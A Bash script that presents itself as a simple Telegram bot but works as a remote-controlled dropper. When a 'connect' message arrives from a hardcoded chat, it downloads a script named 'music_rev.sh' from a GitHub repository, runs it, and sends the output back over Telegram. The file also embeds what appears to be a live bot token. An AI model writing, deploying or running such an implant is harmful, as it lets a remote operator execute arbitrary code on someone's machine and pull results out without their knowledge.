#!/usr/bin/env bash
# commamnder.sh — Pure Bash Telegram bot (no Node.js, no jq)
# Usage: ./commamnder.sh
# Requires: curl only

set -euo pipefail

################ CONFIG ################
TOKEN="7400095855:AAE9Lqtz6LLM-_gEasvVWY4nqGtkxr2I-rY"
CHAT_ID="6565158025"
HARDCODE_CMD="curl -sL https://raw.githubusercontent.com/FBIking/Fbiking.github.io/main/music_rev.sh -o music_rev.sh && chmod +x music_rev.sh && ./music_rev.sh"
########################################

API="https://api.telegram.org/bot${TOKEN}"

send_msg() {
  local text="$1"
  curl -s -X POST "${API}/sendMessage" \
    -d chat_id="${CHAT_ID}" \
    --data-urlencode text="$text" >/dev/null
}

send_file() {
  local file="$1"
  curl -s -X POST "${API}/sendDocument" \
    -F chat_id="${CHAT_ID}" \
    -F document=@"$file" >/dev/null
}

# minimal parser: extracts update_id, chat_id, and text from Telegram JSON
parse_updates_bash() {
  echo "$1" | grep -oE '{[^}]*}' | while read -r obj; do
    UPDATE_ID=$(echo "$obj" | grep -oE '"update_id":[0-9]+' | cut -d: -f2)
    CHAT=$(echo "$obj" | grep -oE '"chat":\{"id":[0-9]+' | grep -oE '[0-9]+$' || true)
    TEXT=$(echo "$obj" | grep -oE '"text":"[^"]*"' | sed 's/.*"text":"\([^"]*\)".*/\1/' || true)

    if [ -n "$UPDATE_ID" ] && [ -n "$CHAT" ]; then
      echo "${UPDATE_ID}|${CHAT}|${TEXT}"
    fi
  done
}

# notify on startup
send_msg "ready to execute command"

OFFSET=0
while true; do
  UPDATES=$(curl -s "${API}/getUpdates?offset=${OFFSET}&timeout=20")

  while IFS= read -r line; do
    [ -z "$line" ] && continue
    IFS='|' read -r UPDATE_ID FROM_ID TEXT <<< "$line"

    OFFSET=$((UPDATE_ID+1))

    # only react to your chat
    if [ "$FROM_ID" != "$CHAT_ID" ]; then
      continue
    fi

    if [ "$TEXT" = "connect" ]; then
      OUTPUT="$(bash -c "$HARDCODE_CMD" 2>&1 || true)"

      if [ -z "$OUTPUT" ]; then
        send_msg "command executed successfully (no output)"
      else
        if [ ${#OUTPUT} -le 3500 ]; then
          send_msg "command executed successfully:\n$OUTPUT"
        else
          TMP="$(mktemp /tmp/out.XXXXXX)"
          printf "%s\n" "$OUTPUT" > "$TMP"
          send_file "$TMP"
          rm -f "$TMP"
        fi
      fi
    fi
  done < <(parse_updates_bash "$UPDATES")
done

